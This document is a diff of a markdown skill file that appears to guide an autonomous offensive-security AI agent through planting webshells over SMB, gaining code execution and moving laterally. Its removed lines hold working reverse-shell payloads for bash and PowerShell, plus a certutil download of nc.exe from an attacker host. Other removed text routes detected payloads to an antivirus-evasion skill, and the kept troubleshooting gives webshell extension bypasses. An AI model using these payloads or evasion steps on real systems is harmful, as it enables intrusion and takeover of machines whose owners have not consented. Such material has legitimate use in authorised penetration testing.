@@ -50,13 +50,11 @@ When an engagement directory exists:
 
 This skill covers writing webshells via SMB and achieving initial code
 execution through them. When you reach the boundary of this scope — whether
-through a routing instruction ("Route to **skill-name**") or by discovering
-findings outside your domain — **STOP**.
+through completing your methodology or discovering findings outside your domain — **STOP**.
 
 Do not load or execute another skill. Do not continue past your scope boundary.
 Instead, return to the orchestrator with:
   - What was found (vulns, credentials, access gained)
-  - Recommended next skill (the bold **skill-name** from routing instructions)
   - Context to pass (injection point, target, working payloads, etc.)
 
 The orchestrator decides what runs next. Your job is to execute this skill
@@ -252,42 +250,6 @@ If the webshell responds with the service account name (e.g., `nt authority\loca
 
 ## Step 4: Establish Reverse Shell
 
-### Reverse Shell via MCP
-
-1. Call `start_listener(port=<port>)` to prepare a catcher on the attackbox
-2. Send a reverse shell payload through the webshell:
-
-**PHP (Linux):**
-```bash
-curl -s "http://TARGET/shell.php" --data-urlencode \
-  "cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'"
-```
-
-**PHP (Windows — PowerShell):**
-```bash
-curl -s "http://TARGET/shell.php" --data-urlencode \
-  "cmd=powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length))-ne 0){\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
-```
-
-**ASPX (Windows — PowerShell):**
-```bash
-# Same PowerShell reverse shell, through the ASPX ?c= parameter
-curl -s "http://TARGET/shell.aspx" --data-urlencode \
-  "c=powershell -nop -c \"...\""
-```
-
-**ASPX (Windows — nc.exe):**
-```bash
-# First transfer nc.exe
-curl -s "http://TARGET/shell.aspx?c=certutil+-urlcache+-f+http://ATTACKER:8080/nc.exe+C:\Windows\Temp\nc.exe"
-# Then connect back
-curl -s "http://TARGET/shell.aspx?c=C:\Windows\Temp\nc.exe+ATTACKER+PORT+-e+cmd.exe"
-```
-
-3. Call `list_sessions()` to verify the connection
-4. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
-5. Enumerate the service account: `whoami`, `whoami /priv`, `whoami /groups`
-
 ## Step 5: Same-Host Lateral Movement via .NET Impersonation
 
 When you have a shell as one service account (e.g., `svc_apache`) but need to
@@ -373,43 +335,6 @@ After achieving RCE through the webshell:
 When routing, always pass along: target IP, current user, shell session ID,
 web technology, and any additional writable paths discovered.
 
-## Stall Detection
-
-If you have spent **5 or more tool-calling rounds** on the same failure with
-no meaningful progress — same error, no new information, no change in output
-— **stop**.
-
-**What counts as progress:**
-- Trying a variant or alternative **documented in this skill**
-- Adjusting syntax, flags, or parameters per the Troubleshooting section
-- Gaining new diagnostic information (different error, partial success)
-
-**What does NOT count as progress:**
-- Writing custom exploit code not provided in this skill
-- Inventing workarounds using techniques from other domains
-- Retrying the same command with trivially different input
-
-When stalled, return to the orchestrator with what was tried and why it failed.
-
-## AV/EDR Detection
-
-If the webshell is caught by antivirus — file vanishes after upload, 403 on
-access despite correct path, or "blocked by administrator" errors:
-
-```
-
-### AV/EDR Blocked
-- Payload: <webshell type> (e.g., "PHP system() webshell")
-- Detection: <what happened> (e.g., "file quarantined after SMB write")
-- AV product: <if known>
-- Technique: SMB share webshell deployment
-- Payload requirements: <web technology> webshell with command execution
-- Target OS: <version>
-- Current access: <user and method>
-```
-
-The orchestrator will route to **av-edr-evasion** for a bypass payload.
-
 ## Troubleshooting
 
 ### smbclient "NT_STATUS_ACCESS_DENIED"
@@ -425,7 +350,7 @@ The orchestrator will route to **av-edr-evasion** for a bypass payload.
 ### Webshell uploads but returns 403
 - Web server may block the extension — try `.phtml`, `.php5`, `.phar` for PHP
 - IIS may have handler restrictions — try `.ashx` or `.asmx` instead of `.aspx`
-- Route to **file-upload-bypass** for comprehensive extension bypass methodology
+- Escalate for comprehensive extension bypass methodology
 
 ### PowerShell .NET impersonation fails with "Access denied"
 - LogonUser requires the target user to have "Allow log on locally" right
